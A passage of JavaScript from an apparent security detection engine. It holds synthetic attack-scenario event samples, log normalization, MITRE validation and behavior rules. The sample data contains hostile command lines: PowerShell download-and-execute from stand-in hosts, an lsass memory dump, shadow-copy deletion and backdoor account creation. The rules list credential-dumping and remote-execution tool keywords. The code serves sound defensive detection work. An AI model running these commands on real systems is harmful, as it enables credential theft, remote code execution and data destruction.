      if (typeof input === 'object') {
        if (Array.isArray(input.items)) return input.items;
        if (Array.isArray(input.detections)) return input.detections;
        return [];
      }
      return [];
    }

    // ── Build sample scenario events ─────────────────────────────
    function getSampleEvents(scenario) {
      const now = Date.now();
      const ts  = (offset) => new Date(now - (offset||0)).toISOString();
      const scenarios = {
        brute_force_compromise: [
          { EventID:4625, Computer:'DC01', User:'CORP\\admin', SourceIP:'10.10.10.55', LogonType:3, Status:'0xC000006A', TimeGenerated:ts(240000) },
          { EventID:4625, Computer:'DC01', User:'CORP\\admin', SourceIP:'10.10.10.55', LogonType:3, Status:'0xC000006A', TimeGenerated:ts(180000) },
          { EventID:4624, Computer:'DC01', User:'CORP\\admin', SourceIP:'10.10.10.55', LogonType:3, Status:'Success',    TimeGenerated:ts(120000) },
          { EventID:4688, Computer:'DC01', User:'CORP\\admin', ParentProcess:'cmd.exe', ProcessName:'net.exe', CommandLine:'net user hacker P@ssw0rd /add', TimeGenerated:ts(60000) },
        ],
        ransomware: [
          { EventID:4688, Computer:'WS-42', User:'john.doe', ProcessName:'cmd.exe', CommandLine:'cmd.exe /c powershell -EncodedCommand aQBlAHgA', TimeGenerated:ts(300000) },
          { EventID:4688, Computer:'WS-42', User:'john.doe', ProcessName:'powershell.exe', CommandLine:'powershell -NonInteractive -EncodedCommand aQBlAHgA', TimeGenerated:ts(260000) },
          { EventID:4688, Computer:'WS-42', User:'john.doe', ProcessName:'vssadmin.exe', CommandLine:'vssadmin delete shadows /all /quiet', TimeGenerated:ts(180000) },
          { EventID:4688, Computer:'WS-42', User:'john.doe', ProcessName:'net.exe', CommandLine:'net user hacker1 Passw0rd! /add', TimeGenerated:ts(120000) },
        ],
        lateral_movement: [
          { EventID:4624, Computer:'DC-01', User:'Administrator', SourceIP:'192.168.1.50', LogonType:3, Status:'Success', TimeGenerated:ts(500000) },
          { EventID:4688, Computer:'DC-01', User:'Administrator', ProcessName:'net.exe', CommandLine:'net view /domain', TimeGenerated:ts(480000) },
          { EventID:4624, Computer:'SERVER-03', User:'Administrator', SourceIP:'192.168.1.42', LogonType:3, Status:'Success', TimeGenerated:ts(420000) },
          { EventID:4688, Computer:'SERVER-03', User:'Administrator', ProcessName:'net.exe', CommandLine:'net group "Domain Admins"', TimeGenerated:ts(400000) },
          { EventID:4688, Computer:'SERVER-03', User:'Administrator', ProcessName:'cmd.exe', ParentProcess:'net.exe', CommandLine:'cmd.exe /c net user hacker2 P@ss /add', TimeGenerated:ts(380000) },
        ],
        credential_dump: [
          { EventID:4688, Computer:'WORKSTATION-42', User:'john.doe', ProcessName:'procdump64.exe', CommandLine:'procdump64.exe -ma lsass.exe C:\\Temp\\lsass.dmp', TimeGenerated:ts(300000) },
          { EventID:4624, Computer:'WORKSTATION-42', User:'Administrator', SourceIP:'127.0.0.1', LogonType:9, Status:'Success', TimeGenerated:ts(240000) },
          { EventID:4688, Computer:'WORKSTATION-42', User:'Administrator', ProcessName:'powershell.exe', CommandLine:'powershell -enc SQBFAFgA', TimeGenerated:ts(220000) },
          { EventID:4688, Computer:'WORKSTATION-42', User:'Administrator', ProcessName:'net.exe', CommandLine:'net user backdoor_svc BackD00r! /add', TimeGenerated:ts(180000) },
        ],
        apt: [
          { EventID:4688, Computer:'WS-01', User:'analyst', ProcessName:'mshta.exe', CommandLine:'mshta.exe http://cdn.update-service.net/flash.hta', TimeGenerated:ts(3600000) },
          { EventID:4688, Computer:'WS-01', User:'analyst', ProcessName:'powershell.exe', CommandLine:"powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://update-service.net/p.ps1')", TimeGenerated:ts(3500000) },
          { EventID:4625, Computer:'DC-01', User:'analyst', SourceIP:'10.1.1.201', LogonType:3, Status:'0xC000006A', TimeGenerated:ts(3200000) },
          { EventID:4624, Computer:'DC-01', User:'analyst', SourceIP:'10.1.1.201', LogonType:3, Status:'Success', TimeGenerated:ts(3100000) },
          { EventID:4688, Computer:'DC-01', User:'analyst', ProcessName:'net.exe', CommandLine:'net user aptsvc Sup3r$ecret /add', TimeGenerated:ts(3000000) },
        ],
        insider: [
          { EventID:4688, Computer:'WS-33', User:'j.smith', ProcessName:'7z.exe', CommandLine:'7z.exe a -tzip C:\\Temp\\data.zip C:\\CorpData\\HR\\*', TimeGenerated:ts(7200000) },
          { EventID:4688, Computer:'WS-33', User:'j.smith', ProcessName:'xcopy.exe', CommandLine:'xcopy /s /e C:\\CorpData\\Source E:\\External\\backup', TimeGenerated:ts(6700000) },
          { EventID:4688, Computer:'WS-33', User:'j.smith', ProcessName:'net.exe', CommandLine:'net user temp_exfil_svc P@ssw0rd /add', TimeGenerated:ts(6600000) },
        ],
        supply_chain: [
          { EventID:4688, Computer:'DEV-01', User:'developer', ProcessName:'node.exe', CommandLine:'npm install lodash-utils-extra@3.1.2', TimeGenerated:ts(86400000) },
          { EventID:4688, Computer:'DEV-01', User:'developer', ProcessName:'powershell.exe', CommandLine:"powershell -NonI -w Hidden -c [System.Net.WebClient]::new().DownloadFile('http://upd8.cc/agent','C:\\Temp\\a.exe')", TimeGenerated:ts(86300000) },
          { EventID:4624, Computer:'DEV-01', User:'developer', SourceIP:'45.142.212.100', LogonType:3, Status:'Success', TimeGenerated:ts(86000000) },
          { EventID:4688, Computer:'DEV-01', User:'developer', ProcessName:'net.exe', CommandLine:'net user svc_install P@ssHacked /add', TimeGenerated:ts(85900000) },
        ],
      };
      const scMap = {
        ransomware:'ransomware', lateral_movement:'lateral_movement',
        credential_dump:'credential_dump', apt:'apt', insider:'insider', supply_chain:'supply_chain',
      };
      return scenarios[scMap[scenario]] || scenarios.brute_force_compromise;
    }


    // ════════════════════════════════════════════════════════════════
    //  LOG_NORM — MANDATORY UNIFIED NORMALIZATION LAYER  (Policy §1)
    //  All telemetry sources normalized to ONE canonical schema BEFORE
    //  any detection, classification, or MITRE assignment occurs.
    //  Operates across: Windows | Firewall | Database | Cloud | App/API
    // ════════════════════════════════════════════════════════════════
    function _logNorm(raw) {
      if (!raw || typeof raw !== 'object') return null;
      const r = Object.assign({}, raw);

      // ── Universal field aliases ────────────────────────────────
      const ts = r.timestamp || r.TimeGenerated || r.TimeCreated ||
                 r.time || r.date || r['@timestamp'] || r.eventTime ||
                 r.occurred || r.created_at || new Date().toISOString();

      const actor = r.user || r.User || r.SubjectUserName || r.TargetUserName ||
                    r.username || r.actor || r.principal || r.identity ||
                    r.source_user || r.src_user || r.initiator || '';

      const target = r.target || r.object || r.resource || r.dest_resource ||
                     r.process || r.NewProcessName || r.ProcessName || r.Image ||
                     r.file || r.filename || r.table || r.db_object || r.url ||
                     r.destIp || r.DestinationIp || r.dest_ip || r.dst_ip || '';

      const action = r.action || r.activity || r.operation || r.event_action ||
                     r.verb || r.method || r.http_method || r.commandLine ||
                     r.CommandLine || r.cmdLine || r.query_type || r.db_action || '';

      // ── Source-type detection (pre-norm) ─────────────────────
      const rawSrc = (r.source || r.log_source || r.logsource || r.Channel ||
                      r.source_type || r.log_type || r.type || '').toLowerCase();
      const rawMsg = (r.message || r.msg || r.raw || r.description || '').toLowerCase();
      const eid    = parseInt(r.EventID ?? r.eventId ?? r.event_id, 10);

      let sourceType = 'endpoint';
      if (r.query || r.sql || r.statement || r.db_name || r.database ||
          rawSrc.match(/(mssql|mysql|oracle|postgres|mongo|db)/) ||
          rawMsg.match(/(select|insert|update|delete|drop|grant|revoke)/)) {
        sourceType = 'database';
      } else if (r.url || r.uri || r.request || r.http_method || r.response_code ||
                 r.status_code || rawSrc.match(/(apache|nginx|iis|squid|proxy|web)/) ||
                 rawMsg.match(/(get |post |put |delete |http\/)/)) {
        sourceType = 'application';
      } else if (r.destIp || r.DestinationIp || r.dest_ip || r.dst_ip || r.bytes_in ||
                 r.bytes_out || r.protocol || rawSrc.match(/(firewall|fw|palo|fortinet|checkpoint|nsg|acl|flow)/) ||
                 (eid >= 5152 && eid <= 5159)) {
        sourceType = 'network';
      } else if (r.cloud_provider || r.awsRegion || r.azure_resource || r.gcp_project ||
                 r.eventSource || r.recipientAccountId || r.subscriptionId || r.projectId ||
                 rawSrc.match(/(aws|azure|gcp|cloudtrail|guard.?duty|sentinel|defender)/) ||
                 rawMsg.match(/(arn:|resourceId:|projects\/|accounts\/)/)) {
        sourceType = 'cloud';
      }

      // ── event_type classification (behavior-based) ────────────
      let eventType = 'generic';
      if (sourceType === 'endpoint') {
        if (eid === 4688 || r.NewProcessName || r.Image) eventType = 'process_creation';
        else if (eid === 4624 || eid === 4625 || eid === 4634 ||
                 (r.LogonType !== undefined)) eventType = 'authentication';
        else if (eid === 4688 && (r.commandLine || r.CommandLine)) eventType = 'command_execution';
        else if (eid >= 4720 && eid <= 4767) eventType = 'account_management';
        else if (eid === 1102 || eid === 4719 || eid === 4906) eventType = 'log_tampering';
        else if (eid >= 5140 && eid <= 5145) eventType = 'file_share_access';
        else if (eid === 4698 || eid === 4702 || eid === 4703 ||
                 eid === 4704 || eid === 7045 || eid === 4697) eventType = 'scheduled_task_service';
        else if (eid === 1 || r.Image) eventType = 'process_creation';      // Sysmon EID 1
        else if (eid === 3 || r.DestinationIp) eventType = 'network_connection';
        else if (eid === 11 || r.TargetFilename) eventType = 'file_created';
        else if (eid === 13 || r.TargetObject) eventType = 'registry_write';
      } else if (sourceType === 'network') {
        const act = (r.action || r.direction || '').toLowerCase();
        eventType = act.includes('deny') || act.includes('block') || act.includes('drop')
          ? 'connection_blocked' : 'network_connection';
      } else if (sourceType === 'database') {
        const q = (r.query || r.sql || r.statement || '').toLowerCase();
        if (q.match(/(select|read)/)) eventType = 'query_execution';
        else if (q.match(/(insert|update|delete|merge)/)) eventType = 'data_modification';
        else if (q.match(/(drop|truncate|alter)/)) eventType = 'schema_modification';
        else if (q.match(/(grant|revoke|create user|alter user)/)) eventType = 'privilege_change';
        else eventType = 'query_execution';
      } else if (sourceType === 'cloud') {
        const ev = (r.eventName || r.operationName || r.methodName || '').toLowerCase();
        if (ev.match(/login|signin|authenticate|assume.?role/)) eventType = 'authentication';
        else if (ev.match(/create|launch|start|deploy/)) eventType = 'resource_creation';
        else if (ev.match(/delete|terminate|destroy|stop/)) eventType = 'resource_deletion';
        else if (ev.match(/getobject|listbucket|describe|get|list/)) eventType = 'data_access';
        else if (ev.match(/attach|put|update|modify|change/)) eventType = 'configuration_change';
        else if (ev.match(/createpolicy|putpolicy|attach|grant/)) eventType = 'privilege_change';
        else eventType = 'cloud_api_call';
      } else if (sourceType === 'application') {
        const code = parseInt(r.response_code || r.status_code || 0, 10);
        if (code >= 400 && code < 500) eventType = 'auth_failure';
        else if (code >= 500) eventType = 'server_error';
        else if ((r.http_method || r.method || '').toUpperCase() === 'POST') eventType = 'api_write';
        else eventType = 'http_request';
      }

      // ── Build unified normalized event ─────────────────────────
      const norm = {
        // ── Schema fields (Policy §1) ──────────────────────────
        event_type    : eventType,
        source_type   : sourceType,
        actor         : actor,
        action        : action,
        target        : target,
        context       : {
          commandLine   : r.commandLine || r.CommandLine || r.cmdLine || '',
          parentProcess : r.parentProcess || r.ParentProcessName || r.ParentImage || '',
          query         : r.query || r.sql || r.statement || '',
          port          : r.destPort || r.DestinationPort || r.dest_port || r.port || '',
          protocol      : r.protocol || r.Protocol || '',
          url           : r.url || r.uri || r.request || '',
          cloudRegion   : r.awsRegion || r.region || r.location || '',
          cloudResource : r.resourceId || r.arn || r.azure_resource || r.gcp_resource || '',
        },
        // ── Identity (enriched) ────────────────────────────────
        actor_host    : r.computer || r.Computer || r.ComputerName || r.hostname || r.host || '',
        actor_ip      : r.srcIp || r.SourceIP || r.SourceIPAddress || r.src_ip || r.IpAddress || r.clientIP || '',
        dest_ip       : r.destIp || r.DestinationIp || r.DestinationAddress || r.dest_ip || r.dst_ip || '',
        dest_port     : r.destPort || r.DestinationPort || r.dest_port || r.port || '',
        // ── Time ───────────────────────────────────────────────
        timestamp     : ts,
        // ── Raw passthrough (for rule engine compat) ──────────
        EventID       : isNaN(eid) ? r.EventID : eid,
        commandLine   : r.commandLine || r.CommandLine || r.cmdLine || r.ProcessCmdLine || '',
        process       : r.process || r.NewProcessName || r.ProcessName || r.Image || r.exe || '',
        parentProcess : r.parentProcess || r.ParentProcessName || r.ParentProcess || r.ParentImage || '',
        user          : actor,
        computer      : r.computer || r.Computer || r.ComputerName || r.hostname || r.host || '',
        srcIp         : r.srcIp || r.SourceIP || r.SourceIPAddress || r.src_ip || r.IpAddress || r.clientIP || '',
        destIp        : r.destIp || r.DestinationIp || r.DestinationAddress || r.dest_ip || r.dst_ip || '',
        destPort      : r.destPort || r.DestinationPort || r.dest_port || r.port || '',
        LogonType     : r.LogonType || r.logon_type || '',
        // Cloud-specific
        cloudProvider : r.cloud_provider || r.eventSource?.split('.')[0] || '',
        cloudEventName: r.eventName || r.operationName || r.methodName || '',
        cloudRegion   : r.awsRegion || r.region || r.location || '',
        cloudActor    : r.userIdentity?.arn || r.callerIdentity || actor,
        cloudResource : r.resourceId || r.arn || r.requestParameters?.bucketName || '',
        cloudSrcIp    : r.sourceIPAddress || r.clientIP || r.ipAddress || '',
        // Database-specific
        dbQuery       : r.query || r.sql || r.statement || '',
        dbName        : r.db_name || r.database || r.databaseName || '',
        dbUser        : actor,
        dbTable       : r.table || r.object || r.db_object || '',
        dbOperation   : r.operation || r.query_type || r.db_action || eventType,
        // App/API-specific
        httpMethod    : r.http_method || r.method || r.verb || '',
        httpStatus    : r.response_code || r.status_code || r.http_status || '',
        httpUrl       : r.url || r.uri || r.request_url || '',
        httpUserAgent : r.user_agent || r.userAgent || r.UserAgent || '',
        // Firewall/Network-specific
        fwAction      : r.action || r.fw_action || r.disposition || '',
        fwProtocol    : r.protocol || r.Protocol || r.proto || '',
        fwBytes       : parseInt(r.bytes || r.bytes_total || 0, 10),
        fwPkts        : parseInt(r.packets || r.pkt_count || 0, 10),
        // Original raw event passthrough
        _raw          : raw,
        _os           : _detectOS(r),
        _logSource    : sourceType,
        _normVersion  : 'LOG_NORM-v1',
      };
      return norm;
    }

    // ════════════════════════════════════════════════════════════════
    //  DOMAIN_CLASSIFIER  (Policy §2)
    //  Returns the exact security domain for a normalized event.
    //  Classification MUST occur BEFORE any detection logic.
    //  Prevents cross-domain technique misassignment (§2 strict).
    // ════════════════════════════════════════════════════════════════
    const DOMAIN_CLASSIFIER = {
      classify(norm) {
        switch (norm.source_type) {
          case 'endpoint'    : return 'endpoint';
          case 'network'     : return 'network';
          case 'database'    : return 'database';
          case 'application' : return 'application';
          case 'cloud'       : return 'cloud';
          default            : return 'unknown';
        }
      },
      // Domain-event_type compatibility matrix (Policy §2 enforcement)
      isCompatible(domain, technique) {
        if (!technique) return true;
        const t = technique.toUpperCase();
        // T1190 (Exploit Public-Facing App) — ONLY valid on network/application
        if (t === 'T1190' && !['network','application','cloud'].includes(domain)) return false;
        // T1003 (OS Credential Dumping) — endpoint ONLY
        if (t.startsWith('T1003') && domain !== 'endpoint') return false;
        // T1059 (Scripting) — endpoint ONLY
        if (t.startsWith('T1059') && domain !== 'endpoint') return false;
        // T1021 (Remote Services) — endpoint/network only
        if (t.startsWith('T1021') && !['endpoint','network'].includes(domain)) return false;
        // T1552 (Unsecured Credentials in DB) — database domain
        if (t === 'T1552.001' && domain !== 'database') return false;
        return true;
      },
    };

    // ════════════════════════════════════════════════════════════════
    //  CONTEXT_VALIDATOR  (Policy §3 — pre-detection gate)
    //  Validates: required attributes exist, behavior matches domain,
    //  sufficient evidence exists. Returns { valid, reason }.
    //  If NOT valid → NO detection created.
    // ════════════════════════════════════════════════════════════════
    const CONTEXT_VALIDATOR = {
      validate(norm, domain) {
        if (!norm) return { valid: false, reason: 'null event' };
        // Required attributes exist
        if (!norm.timestamp) return { valid: false, reason: 'missing timestamp' };
        if (!norm.source_type) return { valid: false, reason: 'missing source_type' };
        if (!norm.event_type) return { valid: false, reason: 'missing event_type' };
        // Domain-behavior consistency
        if (domain === 'database') {
          if (!norm.dbQuery && !norm.dbOperation)
            return { valid: false, reason: 'database event missing query/operation' };
        }
        if (domain === 'network') {
          if (!norm.dest_ip && !norm.actor_ip)
            return { valid: false, reason: 'network event missing IP addresses' };
        }
        if (domain === 'cloud') {
          if (!norm.cloudEventName && !norm.cloudResource && !norm.cloudActor)
            return { valid: false, reason: 'cloud event missing event name/resource/actor' };
        }
        if (domain === 'application') {
          if (!norm.httpUrl && !norm.httpMethod && !norm.httpStatus)
            return { valid: false, reason: 'application event missing HTTP fields' };
        }
        return { valid: true, reason: 'ok' };
      },
    };

    // ════════════════════════════════════════════════════════════════
    //  MITRE_VALIDATOR  (Policy §8 — context-before-technique)
    //  NEVER assigns technique unless full context is validated.
    //  If uncertain → technique=null, confidence=LOW
    // ════════════════════════════════════════════════════════════════
    const MITRE_VALIDATOR = {
      // Validate that technique assignment is domain-consistent
      validate(technique, domain, norm, evidence) {
        if (!technique) return { technique: null, confidence: 'LOW', reason: 'no technique proposed' };
        if (!DOMAIN_CLASSIFIER.isCompatible(domain, technique)) {
          return {
            technique: null, confidence: 'LOW',
            reason: `Technique ${technique} not valid for domain ${domain}`,
          };
        }
        // T1190: requires web server or external exposure evidence
        if (technique === 'T1190') {
          const hasWebCtx = norm.httpUrl || norm.httpMethod || norm.httpStatus ||
                            domain === 'application' || domain === 'network';
          if (!hasWebCtx) return { technique: null, confidence: 'LOW',
            reason: 'T1190 requires web/network context' };
        }
        // T1003: requires process evidence on endpoint
        if (technique.startsWith('T1003')) {
          const hasProcessCtx = norm.process || norm.commandLine || norm.EventID === 4688;
          if (!hasProcessCtx || domain !== 'endpoint')
            return { technique: null, confidence: 'LOW',
              reason: 'T1003 requires endpoint process context' };
        }
        // Evidence-based confidence
        const evidenceFields = [
          norm.commandLine, norm.process, norm.actor, norm.actor_ip,
          norm.dest_ip, norm.dbQuery, norm.cloudEventName, norm.httpUrl,
        ].filter(Boolean).length;
        const confidence = evidenceFields >= 4 ? 'HIGH' :
                           evidenceFields >= 2 ? 'MEDIUM' : 'LOW';
        return { technique, confidence, reason: 'validated' };
      },
    };

    // ════════════════════════════════════════════════════════════════
    //  EVIDENCE_FUSER  (Policy §5 — cross-field correlation)
    //  Merges multi-field evidence into ONE unified detection.
    //  One real-world behavior = ONE detection. No field-level splits.
    // ════════════════════════════════════════════════════════════════
    const EVIDENCE_FUSER = {
      // Build a unified evidence block from multiple correlated events
      fuse(events, domain) {
        const block = {
          fields_present  : [],
          correlation_keys: [],
          evidence_count  : events.length,
          domain,
        };
        if (domain === 'endpoint') {
          const procs = [...new Set(events.map(e => e.process).filter(Boolean))];
          const cmds  = [...new Set(events.map(e => e.commandLine).filter(Boolean))];
          const users = [...new Set(events.map(e => e.actor).filter(Boolean))];
          const hosts = [...new Set(events.map(e => e.actor_host).filter(Boolean))];
          const pProcs= [...new Set(events.map(e => e.parentProcess).filter(Boolean))];
          if (procs.length)  { block.processes = procs;       block.fields_present.push('process'); }
          if (cmds.length)   { block.commands   = cmds;       block.fields_present.push('commandLine'); }
          if (users.length)  { block.users       = users;     block.fields_present.push('actor'); }
          if (hosts.length)  { block.hosts       = hosts;     block.fields_present.push('host'); }
          if (pProcs.length) { block.parentProcs = pProcs;    block.fields_present.push('parentProcess'); }
          // Correlation key: process + commandLine + parentProcess (Policy §5)
          block.correlation_keys.push(`proc::${procs[0]||'?'}::cmd::${cmds[0]?.slice(0,40)||'?'}::parent::${pProcs[0]||'?'}`);
        } else if (domain === 'network') {
          const srcIps  = [...new Set(events.map(e => e.actor_ip).filter(Boolean))];
          const dstIps  = [...new Set(events.map(e => e.dest_ip).filter(Boolean))];
          const ports   = [...new Set(events.map(e => e.dest_port).filter(Boolean))];
          const actions = [...new Set(events.map(e => e.fwAction || e.action).filter(Boolean))];
          if (srcIps.length)  { block.src_ips   = srcIps;   block.fields_present.push('src_ip'); }
          if (dstIps.length)  { block.dst_ips   = dstIps;   block.fields_present.push('dst_ip'); }
          if (ports.length)   { block.ports     = ports;    block.fields_present.push('port'); }
          if (actions.length) { block.actions   = actions;  block.fields_present.push('action'); }
          block.correlation_keys.push(`src::${srcIps[0]||'?'}::dst::${dstIps[0]||'?'}::port::${ports[0]||'?'}`);
        } else if (domain === 'database') {
          const users = [...new Set(events.map(e => e.dbUser).filter(Boolean))];
          const tbls  = [...new Set(events.map(e => e.dbTable).filter(Boolean))];
          const ops   = [...new Set(events.map(e => e.dbOperation).filter(Boolean))];
          const dbs   = [...new Set(events.map(e => e.dbName).filter(Boolean))];
          if (users.length) { block.db_users = users; block.fields_present.push('db_user'); }
          if (tbls.length)  { block.tables    = tbls;  block.fields_present.push('table'); }
          if (ops.length)   { block.operations= ops;   block.fields_present.push('operation'); }
          if (dbs.length)   { block.databases = dbs;   block.fields_present.push('database'); }
          block.correlation_keys.push(`user::${users[0]||'?'}::table::${tbls[0]||'?'}::op::${ops[0]||'?'}`);
        } else if (domain === 'cloud') {
          const actors    = [...new Set(events.map(e => e.cloudActor).filter(Boolean))];
          const evtNames  = [...new Set(events.map(e => e.cloudEventName).filter(Boolean))];
          const resources = [...new Set(events.map(e => e.cloudResource).filter(Boolean))];
          const regions   = [...new Set(events.map(e => e.cloudRegion).filter(Boolean))];
          if (actors.length)    { block.cloud_actors  = actors;    block.fields_present.push('cloud_actor'); }
          if (evtNames.length)  { block.cloud_events  = evtNames;  block.fields_present.push('cloud_event'); }
          if (resources.length) { block.cloud_resources=resources; block.fields_present.push('cloud_resource'); }
          if (regions.length)   { block.cloud_regions = regions;   block.fields_present.push('cloud_region'); }
          block.correlation_keys.push(`actor::${actors[0]||'?'}::evt::${evtNames[0]||'?'}::res::${resources[0]||'?'}`);
        } else if (domain === 'application') {
          const methods  = [...new Set(events.map(e => e.httpMethod).filter(Boolean))];
          const statuses = [...new Set(events.map(e => e.httpStatus).filter(Boolean))];
          const urls     = [...new Set(events.map(e => e.httpUrl).filter(Boolean))];
          const actors   = [...new Set(events.map(e => e.actor || e.actor_ip).filter(Boolean))];
          if (methods.length)  { block.http_methods  = methods;  block.fields_present.push('http_method'); }
          if (statuses.length) { block.http_statuses = statuses; block.fields_present.push('http_status'); }
          if (urls.length)     { block.urls           = urls;    block.fields_present.push('url'); }
          if (actors.length)   { block.requestors     = actors;  block.fields_present.push('actor'); }
          block.correlation_keys.push(`method::${methods[0]||'?'}::url::${urls[0]?.slice(0,40)||'?'}::status::${statuses[0]||'?'}`);
        }
        return block;
      },
    };

    // ════════════════════════════════════════════════════════════════
    //  CONFIDENCE_SCORER  (Policy §9 — mandatory confidence model)
    //  Confidence = f(correlated fields, behavioral evidence, domain
    //                 alignment, known vs unknown patterns)
    // ════════════════════════════════════════════════════════════════
    const CONFIDENCE_SCORER = {
      score(evidenceBlock, hasKnownTool, domainMatch, techniqueValid) {
        let score = 0;
        const n = evidenceBlock.fields_present?.length || 0;
        // Correlated fields contribution (0-40)
        score += Math.min(n * 8, 40);
        // Known tool / signature match (0-30)
        if (hasKnownTool) score += 30;
        // Domain alignment (0-20)
        if (domainMatch) score += 20;
        // Validated MITRE technique (0-10)
        if (techniqueValid) score += 10;
        score = Math.min(score, 100);
        const level = score >= 80 ? 'HIGH' : score >= 50 ? 'MEDIUM' : 'LOW';
        return { score, level };
      },
    };

    // ════════════════════════════════════════════════════════════════
    //  BEHAVIOR_DETECTOR  (Policy §4 — behavior-first model)
    //  Domain-specific behavior rules. Each rule:
    //    1. Domain-classified first
    //    2. Context-validated before firing
    //    3. Evidence-fused (no field-level splits)
    //    4. MITRE-validated before assignment
    //    5. Confidence-scored from multi-field correlation
    // ════════════════════════════════════════════════════════════════
    const BEHAVIOR_DETECTOR = {

      // ── Domain-specific behavior rules ──────────────────────────
      DOMAIN_RULES: {

        // ════════ ENDPOINT DOMAIN ═══════════════════════════════
        endpoint: [
          {
            id: 'BD-EP-001', name: 'Credential Dumping Tool Execution',
            technique: 'T1003.001', tactic: 'credential-access', severity: 'critical',
            match(norms) {
              return norms.filter(n => {
                const cmd  = (n.commandLine || '').toLowerCase();
                const proc = (n.process || '').toLowerCase();
                return n.event_type === 'process_creation' && (
                  proc.includes('mimikatz') || cmd.includes('mimikatz') ||
                  cmd.includes('sekurlsa') || cmd.includes('lsadump') ||
                  (proc.includes('procdump') && cmd.includes('lsass')) ||
                  cmd.includes('comsvcs.dll') ||
                  (cmd.includes('rundll32') && cmd.includes('lsass'))
                );
              });
            },
            narrative: evts => `Credential dumping tool detected: "${evts[0]?.process||'unknown'}" executed ` +
              `on ${evts[0]?.actor_host||'unknown'} by ${evts[0]?.actor||'unknown'}. ` +
              `Command: ${evts[0]?.commandLine?.slice(0,120)||'N/A'}`,
          },
          {
            id: 'BD-EP-002', name: 'Encoded PowerShell Execution',
            technique: 'T1059.001', tactic: 'execution', severity: 'high',
            match(norms) {
              return norms.filter(n => {
                const cmd  = (n.commandLine || '').toLowerCase();
                const proc = (n.process || '').toLowerCase();
                return n.event_type === 'process_creation' &&
                  (proc.includes('powershell') || proc.includes('pwsh')) &&
                  (cmd.includes('-enc') || cmd.includes('-encodedcommand') ||
                   cmd.includes('bypass') || cmd.includes('-nop') || cmd.includes('invoke-expression'));
              });
            },
            narrative: evts => `PowerShell obfuscated execution: "${evts[0]?.commandLine?.slice(0,150)||'N/A'}" ` +
              `on ${evts[0]?.actor_host||'unknown'}`,
          },
          {
            id: 'BD-EP-003', name: 'Lateral Movement via Remote Execution Tool',
            technique: 'T1021.002', tactic: 'lateral-movement', severity: 'high',
            match(norms) {
              return norms.filter(n => {
                const cmd  = (n.commandLine || '').toLowerCase();
                const proc = (n.process || '').toLowerCase();
                return n.event_type === 'process_creation' && (
                  proc.includes('psexec') || cmd.includes('psexec') ||
                  proc.includes('wmiexec') || cmd.includes('wmiexec') ||
                  proc.includes('smbexec') || cmd.includes('smbexec') ||
                  (proc.includes('wmic') && (cmd.includes('/node:') || cmd.includes('process call')))
                );
              });
            },
            narrative: evts => `Remote execution tool: "${evts[0]?.process||'?'}" — ` +
              `cmd: "${evts[0]?.commandLine?.slice(0,100)||'?'}" on ${evts[0]?.actor_host||'unknown'}`,
          },
          {
            id: 'BD-EP-004', name: 'Defense Evasion — Log Clearing / Audit Tampering',
            technique: 'T1070.001', tactic: 'defense-evasion', severity: 'critical',
            match(norms) {
              return norms.filter(n => {
                const cmd = (n.commandLine || '').toLowerCase();
                const eid = n.EventID;
                return (eid === 1102 || eid === 4719 || eid === 4906) ||
                  (cmd.includes('wevtutil') && cmd.includes('cl')) ||
                  (cmd.includes('clear-eventlog') || cmd.includes('clear-winlogevent'));
              });
            },
            narrative: evts => `Log tampering / event log cleared on ${evts[0]?.actor_host||'unknown'} ` +
              `by ${evts[0]?.actor||'unknown'}. EventID: ${evts[0]?.EventID||'?'}`,
          },
          {
            id: 'BD-EP-005', name: 'Persistence — Scheduled Task / Service Installation',
            technique: 'T1053.005', tactic: 'persistence', severity: 'high',
            match(norms) {
              return norms.filter(n => {
                const cmd  = (n.commandLine || '').toLowerCase();
                const proc = (n.process || '').toLowerCase();
                const eid  = n.EventID;
                return n.event_type === 'process_creation' &&
                  (eid === 4698 || eid === 7045 || eid === 4697 ||
                   proc.includes('schtasks') || cmd.includes('schtasks') ||
                   (proc.includes('sc.exe') && (cmd.includes('create') || cmd.includes('config'))));
              });
            },
            narrative: evts => `Persistence mechanism installed: sched-task/service ` +
              `"${evts[0]?.commandLine?.slice(0,120)||'?'}" on ${evts[0]?.actor_host||'unknown'}`,
          },
          {
            id: 'BD-EP-006', name: 'Data Collection / Staging Before Exfiltration',
            technique: 'T1074.001', tactic: 'collection', severity: 'high',
            match(norms) {
              return norms.filter(n => {
                const cmd  = (n.commandLine || '').toLowerCase();
                const proc = (n.process || '').toLowerCase();
                return n.event_type === 'process_creation' && (
                  proc.includes('7z') || proc.includes('winrar') || proc.includes('winzip') ||
                  cmd.includes(' a -t') || cmd.includes('compress') ||
                  (proc.includes('xcopy') && cmd.includes('/s')) ||
                  (proc.includes('robocopy') && cmd.includes('/mir'))
                );
              });
            },
            narrative: evts => `Data staging: "${evts[0]?.process||'?'}" compressing/copying data ` +
              `"${evts[0]?.commandLine?.slice(0,120)||'?'}"`,
          },
          {
            id: 'BD-EP-007', name: 'Impact — Ransomware / System Recovery Sabotage',
            technique: 'T1490', tactic: 'impact', severity: 'critical',
            match(norms) {
              return norms.filter(n => {
                const cmd  = (n.commandLine || '').toLowerCase();
                const proc = (n.process || '').toLowerCase();
                return n.event_type === 'process_creation' && (
                  (proc.includes('vssadmin') && (cmd.includes('delete') || cmd.includes('resize'))) ||
                  (proc.includes('wbadmin') && cmd.includes('delete')) ||
                  (proc.includes('bcdedit') && (cmd.includes('recoveryenabled no') || cmd.includes('bootstatuspolicy'))) ||
                  (proc.includes('wmic') && cmd.includes('shadowcopy') && cmd.includes('delete')) ||
                  proc.includes('diskshadow')
                );
              });
            },
            narrative: evts => `Ransomware/Wiper — System recovery sabotage: ` +
              `"${evts[0]?.commandLine?.slice(0,150)||'?'}" on ${evts[0]?.actor_host||'unknown'}`,
          },
        ],

        // ════════ NETWORK DOMAIN ═════════════════════════════════
        network: [
          {
            id: 'BD-NET-001', name: 'Port Scan / Network Reconnaissance',
            technique: 'T1046', tactic: 'reconnaissance', severity: 'medium',
            match(norms) {
              // Multiple connections to different ports from same source in window
              const bySource = new Map();
              norms.filter(n => n.source_type === 'network').forEach(n => {
                const k = n.actor_ip || n.srcIp || '';
                if (!k) return;
                if (!bySource.has(k)) bySource.set(k, new Set());
                bySource.get(k).add(n.dest_port);
              });
              const scanners = [];
              bySource.forEach((ports, src) => {
                if (ports.size >= 5) scanners.push({ src, portCount: ports.size });
              });
              if (!scanners.length) return [];
              return norms.filter(n => scanners.some(s => s.src === (n.actor_ip||n.srcIp)));
            },
